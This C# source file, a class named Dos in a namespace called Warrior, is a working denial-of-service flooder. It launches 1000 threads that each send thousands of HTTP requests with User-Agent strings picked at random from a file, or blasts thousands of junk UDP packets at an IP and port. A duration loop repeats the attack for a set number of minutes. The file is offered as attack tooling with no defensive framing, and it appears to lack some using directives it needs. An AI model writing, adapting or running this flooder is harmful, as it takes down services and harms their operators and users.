using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Warrior
{
    public class Dos
    {
        // New DOS Verision targets both Layer 7 and Layer 4-
        static string Get()
        {
            List<string> list = new List<string>();
            var file = File.ReadAllLines("list.txt");
            foreach (var line in file) { 
                list.Add(line);

            }

            Random r = new Random();

            var ran = r.Next(0, list.Count);

            //Console.WriteLine(list[ran]);

            return list[ran];
        }
        void sen(string host)
        {
            try
            {


                for (int i = 0; i < 4000; i++)
                {
                    HttpClient c = new HttpClient();

                    c.DefaultRequestHeaders.Add("User-Agent", Get());
                    var data = c.GetStreamAsync(host);

                    StreamReader r = new StreamReader(data.Result);

                }
            }
            catch (Exception ex) { }
            }
        public void dos(string add, int port)
        {
            try
            {
                if (add.StartsWith("http://") || add.StartsWith("https://") || add.StartsWith("www."))
                {
                    for (int i = 0; i < 1000; i++)
                    {

                        new Thread(() => { sen(add); }).Start();
                    }

                }
                else if (IPAddress.TryParse(add, out var ip))
                {
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
    ProtocolType.Udp);

                    for (int i = 0; i < 11000; i++)
                    {
                        
                        IPAddress serverAddr = IPAddress.Parse(add);
                        IPEndPoint endPoint = new IPEndPoint(serverAddr, port);
                        
                        Byte[] sendBytes = Encoding.ASCII.GetBytes("sdifhosdhDFHBDFGVHifhosdhDFHBDFGVHkfhhhifhosdhDFifhosdhDFHBDFGVHHBDFGVHhhhhhhhhhsduifhosdhDFHBDFGVHFDHFGDHFGFFFFFifhosdhDFHBDFGVHFFFFFFFDSSSSSSSSSSSSSSSifhosdhDFHBDFGVHSSSSSSSSSSSSSSSSSSSSSSSSSSSSFSDTERGYEFDYHTDGHYFRERWSDFCHJUEWSDRXFUCTHJSEWDRXCUJTFifhosdhDFHBDFGVHHWSEDRXCUJSWEXRCDUJTSWEXRCUJrugi5847583495777777777777934444444444444444444444444rfioshfdsiujfhtrjihbtguergtiwgedjf759fhosdhDFHBDFDXFDFSDFF759fhosdhDFHBDFFFFFF444759fhosdhDFHBDFGVHkfhhhifhosdhDFifhosdhDFHBDFGVHHBDFGVHhhhhhhhhhsduifhosdhDFHBDFGVHFDHFGDHFGFFFFFifhosd375975555555555555555");
                        Byte[] sendBytes2 = Encoding.ASCII.GetBytes("sdifhosdhDFHAJjjJKjkkjaFqopmOGpomgMAMFoMPMGmsdmGIOMGOMOGmosgpMGOPopagpoBDFGVHif5☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀☀");

                        sock.SendTo(sendBytes, endPoint);
                        sock.SendTo(sendBytes2, endPoint);
                    }

                }
                else
                {
                    return;
                }


            }
            catch { }


        }
        public void Startddos(string ip, int port, int duration)
        {

            var start = DateTime.Now;
            while ((DateTime.Now - start).TotalMinutes < duration)
            {
                try
                {
                    dos(ip, port);
                    Task.Delay(5000).Wait();
                     

                }
                catch { }
            }

        }
    }
}
